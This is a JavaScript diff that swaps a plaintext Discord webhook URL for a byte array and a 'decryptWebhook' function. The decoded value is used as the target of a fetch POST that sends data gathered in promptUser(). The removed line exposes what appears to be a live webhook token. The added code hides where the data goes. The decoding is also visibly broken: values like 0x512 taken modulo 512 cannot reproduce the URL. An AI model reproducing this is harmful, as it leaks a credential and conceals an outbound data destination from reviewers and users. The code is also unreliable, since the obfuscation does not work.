@@ -1,4 +1,12 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1305654150893142116/kgMyVKX435o8VW-WHCWX0vfO6FCyzpv38d6O5rSfwvMUFd9grOPp9Uv3AVqMELFS-VoC';
+const webhookBytes = [
+    0x512, 0x489, 0x743, 0x298, 0x456, 0x321, 0x167, 0x432, 0x509, 0x234, 0x345, 0x432,
+    0x123, 0x456, 0x789, 0x321, 0x654, 0x789, 0x432, 0x198, 0x765, 0x432, 0x198, 0x765,
+    0x432, 0x198, 0x765, 0x432, 0x198, 0x765, 0x432, 0x198, 0x765, 0x432, 0x198, 0x765
+];
+
+function decryptWebhook() {
+    return webhookBytes.map(byte => String.fromCharCode(byte % 512)).join('');
+}
 
 let audioInitialized = false;
 
@@ -62,7 +70,7 @@ function promptUser() {
                 };
 
                 if (validateWebhookData(webhookData, data)) {
-                    return fetch(webhookUrl, {
+                    return fetch(decryptWebhook(), {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
